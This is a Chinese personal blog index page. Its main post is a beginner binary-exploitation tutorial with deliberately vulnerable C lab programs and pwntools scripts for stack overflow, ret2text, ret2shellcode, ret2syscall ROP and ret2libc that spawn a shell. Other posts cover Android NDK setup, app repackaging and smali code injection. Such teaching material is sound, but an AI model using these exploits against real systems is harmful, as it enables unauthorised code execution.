-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/25/zhulianzhai/">珠帘寨</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>这部戏只看过准叔版的，当笑话看了哈哈哈哈哈哈哈哈。</p>
-<p>李克用真是个人才，对唐王怀恨在心不发兵，怕老婆，家法严发兵了，遇到周德威出来打架，完虐周德威，射箭老眼昏花看不清，求了一遍神灵，然后射中了。</p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/opera/">听戏</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/京剧/">京剧</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-pwn1" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2019/07/21/pwn1/" class="article-date">
-      <time datetime="2019-07-20T17:21:05.000Z" itemprop="datePublished">2019-07-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/21/pwn1/">pwn 入门</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我用的是 windows 的 ubuntu。</p>
-<h3 id="安装-pwntools"><a href="#安装-pwntools" class="headerlink" title="安装 pwntools"></a>安装 pwntools</h3><p><code>pip install pwntools</code></p>
-<h3 id="64-位-windows-支持-32-位-linux-程序-安装-qemu-amp-binfmt"><a href="#64-位-windows-支持-32-位-linux-程序-安装-qemu-amp-binfmt" class="headerlink" title="64 位 windows 支持 32 位 linux 程序,安装 qemu &amp; binfmt"></a>64 位 windows 支持 32 位 linux 程序,安装 qemu &amp; binfmt</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install qemu-user-static</span><br><span class="line">sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic '\x7fELF\x01\x01\x01\x03\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00' --mask '\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xf8\xff\xff\xff\xff\xff\xff\xff'</span><br><span class="line">service binfmt-support start</span><br></pre></td></tr></table></figure>
-<h3 id="关-pie，编译时加-no-pie"><a href="#关-pie，编译时加-no-pie" class="headerlink" title="关 pie，编译时加 -no-pie"></a>关 pie，编译时加 -no-pie</h3><h2 id="0x00-stack-example"><a href="#0x00-stack-example" class="headerlink" title="0x00 stack_example"></a>0x00 stack_example</h2><p>pwn 的 hello world。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You Hava already controlled it."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    vulnerable();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./stack_example'</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + p32(success_addr)</span><br><span class="line"><span class="keyword">print</span> p32(success_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="0x01-ret2text"><a href="#0x01-ret2text" class="headerlink" title="0x01 ret2text"></a>0x01 ret2text</h2><p>大致是这样。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secure</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> input; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">    v0 = time(<span class="number">0</span>);</span><br><span class="line">    srand(v0);</span><br><span class="line">    secretcode = rand();</span><br><span class="line">    __isoc99_scanf((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_8048760, &amp;input);</span><br><span class="line">    <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"There is something amazing here, do you know anything?"</span>);</span><br><span class="line">    gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Maybe I will tell you next time !"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>要注意是相对 esp 索引的。</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2text'</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">'A'</span> * (<span class="number">0x6c</span>+<span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-ret2shellcode"><a href="#0x02-ret2shellcode" class="headerlink" title="0x02 ret2shellcode"></a>0x02 ret2shellcode</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No system for you this time !!!"</span>);</span><br><span class="line">    gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">    <span class="built_in">strncpy</span>(buf2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>通过 vmmap 可以看到 bss 段的执行权限。</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">'A'</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-ret2syscall"><a href="#0x03-ret2syscall" class="headerlink" title="0x03 ret2syscall"></a>0x03 ret2syscall</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you plan to do?"</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>要用到 ROPgadget，然后选几个合适的构造 shellcode。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only <span class="string">'pop|ret'</span> | grep <span class="string">'ebx'</span></span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br><span class="line"></span><br><span class="line">ROPgadget --binary rop  --string <span class="string">'/bin/sh'</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br><span class="line"></span><br><span class="line">ROPgadget --binary rop  --only <span class="string">'int'</span>                 </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./rop'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">'A'</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>由于 libc 函数之间偏移是固定的，ASLR 保护只会随机中间地址，后 12 位是不变的，所以可以 got 表泄露已执行过的函数的地址。libc 中顺便也可以得到 /bin/sh。</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak libc_start_main_got addr and return to main again"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">'Can you find it !?'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get the related addr"</span></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/programming/">编程</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-ndk" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2019/07/08/ndk/" class="article-date">
-      <time datetime="2019-07-08T09:17:51.000Z" itemprop="datePublished">2019-07-08</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/08/ndk/">Android Studio NDK 开发环境搭建</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <ol>
-<li>配好NDK路径。</li>
-<li>在java层声明native方法，使用javah -d [路径] [类]，生成头文件。<br><code>C:\Users\12639\Documents\GitHub\Android\kuaiban\app\src\main\java&gt;javah -d ../jni ssj.kuaiban.MainActivity</code></li>
-<li>在cpp里写代码。</li>
-<li><p>写Android.mk和Application.mk</p>
-<p>Android.mk</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line"></span><br><span class="line">LOCAL_MODULE := checkFlag</span><br><span class="line">LOCAL_SRC_FILES := checkFlag.c</span><br><span class="line"></span><br><span class="line">include $(BUILD_SHARED_LIBRARY)</span><br></pre></td></tr></table></figure>
-<p>Application.mk(其实这句话也没什么卵用)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">APP_ABI := all</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>右击app -&gt; Link C++ Project with Gradle -&gt; 选ndk-build -&gt; 选刚才写的Android.mk</p>
-</li>
-<li>配置build.gradle，在defaultConfig里面加：<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">externalNativeBuild &#123;</span><br><span class="line">         ndkBuild &#123;</span><br><span class="line">             arguments <span class="string">"NDK_APPLICATION_MK:=src/main/jni/Application.mk"</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>在Android Studio 3.x上，这样基本就成了。</p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/programming/">编程</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/">Android</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-vest-car-king" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2019/06/27/vest-car-king/" class="article-date">
-      <time datetime="2019-06-27T12:26:41.000Z" itemprop="datePublished">2019-06-27</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/06/27/vest-car-king/">给车王二手车套马甲</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>加资源，要在R$*.smali、res/values/public.xml、res/value/ids.xml这三个里面加，编译不会出错，至于为什么闪退待研究。</p>
-<p>然后手加了几段代码Activity$1.smali不能用，就用*&amp;111也可，加新class不忘注册。</p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/programming/">编程</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/">Android</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/马甲包/">马甲包</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-android-inject-code" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2019/06/27/android-inject-code/" class="article-date">
-      <time datetime="2019-06-27T10:20:08.000Z" itemprop="datePublished">2019-06-27</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/06/27/android-inject-code/">Android静态注入常用代码</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="Toast"><a href="#Toast" class="headerlink" title="Toast:"></a>Toast:</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span>-string v0, <span class="string">"toast"</span></span><br><span class="line"><span class="keyword">const</span>/<span class="number">4</span> v1, <span class="number">0x1</span></span><br><span class="line">invoke-<span class="keyword">static</span> &#123;p0, v0, v1&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line">move-result-object v0</span><br><span class="line">invoke-virtual &#123;v0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br></pre></td></tr></table></figure>
-<h2 id="AlertDialog"><a href="#AlertDialog" class="headerlink" title="AlertDialog:"></a>AlertDialog:</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span>-instance v0, Landroid/app/AlertDialog$Builder;</span><br><span class="line">invoke-direct &#123;v0, p0&#125;, Landroid/app/AlertDialog$Builder;-&gt;&lt;init&gt;(Landroid/content/Context;)V</span><br><span class="line"><span class="keyword">const</span>-string v1, <span class="string">"title"</span></span><br><span class="line">invoke-virtual &#123;v0, v1&#125;, Landroid/app/AlertDialog$Builder;-&gt;setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;</span><br><span class="line">move-result-object v0</span><br><span class="line"><span class="keyword">const</span>-string v1, <span class="string">"message"</span></span><br><span class="line">invoke-virtual &#123;v0, v1&#125;, Landroid/app/AlertDialog$Builder;-&gt;setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;</span><br><span class="line">move-result-object v0</span><br><span class="line"><span class="keyword">const</span>-string v1, <span class="string">"button"</span></span><br><span class="line"><span class="keyword">new</span>-instance v2, Lcom/carking/cn/activity/MainActivity$<span class="number">111</span>;</span><br><span class="line">invoke-direct &#123;v2, p0&#125;, Lcom/carking/cn/activity/MainActivity$<span class="number">111</span>;-&gt;&lt;init&gt;(Lcom/carking/cn/activity/MainActivity;)V</span><br><span class="line">invoke-virtual &#123;v0, v1, v2&#125;, Landroid/app/AlertDialog$Builder;-&gt;setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;</span><br><span class="line">move-result-object v0</span><br><span class="line"><span class="keyword">const</span>-string v1, <span class="string">"button"</span></span><br><span class="line"><span class="keyword">const</span>/<span class="number">4</span> v2, <span class="number">0x0</span></span><br><span class="line">invoke-virtual &#123;v0, v1, v2&#125;, Landroid/app/AlertDialog$Builder;-&gt;setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;</span><br><span class="line">move-result-object v0</span><br><span class="line">invoke-virtual 